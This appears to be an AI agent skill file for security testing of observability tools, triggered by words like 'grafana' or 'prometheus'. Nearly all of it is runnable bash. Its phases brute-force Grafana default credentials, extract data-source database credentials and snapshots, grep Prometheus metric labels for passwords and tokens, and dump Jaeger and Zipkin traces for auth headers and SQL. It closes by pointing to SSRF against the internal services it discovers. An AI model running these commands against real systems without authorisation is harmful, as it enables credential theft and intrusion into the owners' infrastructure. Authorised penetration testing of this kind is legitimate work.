---
name: tech-observability
description: "Observability platform security testing — Grafana default credentials, Prometheus metrics exposure, Jaeger unauth access, Zipkin, alertmanager webhook abuse, metric exfiltration. Triggers: 'grafana', 'prometheus', 'observability security', 'monitoring security', 'grafana default creds', 'prometheus exposed', 'jaeger security', 'metrics exposure', 'alertmanager'."
---

# Observability Platform Security Testing

Test monitoring and observability tools for exposure and credential issues.

---

## Phase 1: Grafana

```bash
TARGET="http://TARGET:3000"

# Default credentials:
for CRED in "admin:admin" "admin:password" "admin:grafana" "admin:secret"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -u "${CRED%:*}:${CRED#*:}" "$TARGET/api/org")
  [ "$STATUS" == "200" ] && echo "VALID: $CRED"
done | tee output/grafana_creds.txt

# API info without auth (check):
curl -s "$TARGET/api/health" | jq .
curl -s "$TARGET/api/frontend/settings" | jq '.buildInfo' | tee output/grafana_version.txt

# Authenticated: list data sources (contains DB credentials!):
curl -s -u "admin:admin" "$TARGET/api/datasources" | \
  jq '.[] | {type, name, url, user, database}' | tee output/grafana_datasources.txt

# Snapshot unauth bypass (older Grafana):
curl -s "$TARGET/api/snapshots" | jq '.[] | {key, name}' | tee output/grafana_snapshots.txt
curl -s "$TARGET/api/snapshots/VIEW_KEY" | jq . | tee output/grafana_snapshot_data.txt
```

---

## Phase 2: Prometheus

```bash
TARGET="http://TARGET:9090"

# Check unauthenticated access:
curl -s "$TARGET/api/v1/label/__name__/values" | jq '.data[]' | head -20 | tee output/prometheus_metrics.txt

# List targets:
curl -s "$TARGET/api/v1/targets" | jq '.data.activeTargets[].labels' | tee output/prometheus_targets.txt

# Query sensitive metrics:
curl -s "$TARGET/api/v1/query?query=up" | jq '.data.result[] | .metric' | tee output/prometheus_services.txt

# Find secrets in labels:
curl -s "$TARGET/api/v1/label/__name__/values" | jq '.data[]' | \
  while IFS= read -r METRIC; do
    curl -s "$TARGET/api/v1/query?query=$METRIC" | \
      jq '.data.result[] | .metric | to_entries[] | select(.value | contains("pass","secret","token","key")) | .value' 2>/dev/null
  done | tee output/prometheus_secrets.txt

# Alertmanager:
curl -s "http://TARGET:9093/api/v1/alerts" | jq '.data[] | {alertname: .labels.alertname, instance: .labels.instance}' | tee output/alertmanager.txt
```

---

## Phase 3: Jaeger & Zipkin

```bash
TARGET="http://TARGET"

# Jaeger UI (port 16686):
curl -s "$TARGET:16686/api/services" | jq '.data[]' | tee output/jaeger_services.txt

# Get traces (may contain auth headers/tokens):
SERVICE="user-service"
curl -s "$TARGET:16686/api/traces?service=$SERVICE&limit=20" | \
  jq '.data[].spans[].tags[] | select(.key == "http.url" or .key == "db.statement")' | \
  tee output/jaeger_traces.txt

# Zipkin:
curl -s "$TARGET:9411/api/v2/services" | jq . | tee output/zipkin_services.txt
curl -s "$TARGET:9411/api/v2/traces?serviceName=$SERVICE&limit=20" | \
  jq '.[].[] | select(.tags.["http.method"] != null) | {url: .tags.["http.url"], method: .tags.["http.method"]}' | \
  tee output/zipkin_traces.txt
```

---

## Output

Save to `output/`:
- `grafana_datasources.txt` — Grafana DB credentials
- `prometheus_metrics.txt` — exposed metric names
- `jaeger_traces.txt` — distributed traces with request data

## Next Phase

→ `vuln-sensitive-exposure` for credential exposure documentation
→ Use discovered internal services for `vuln-ssrf`
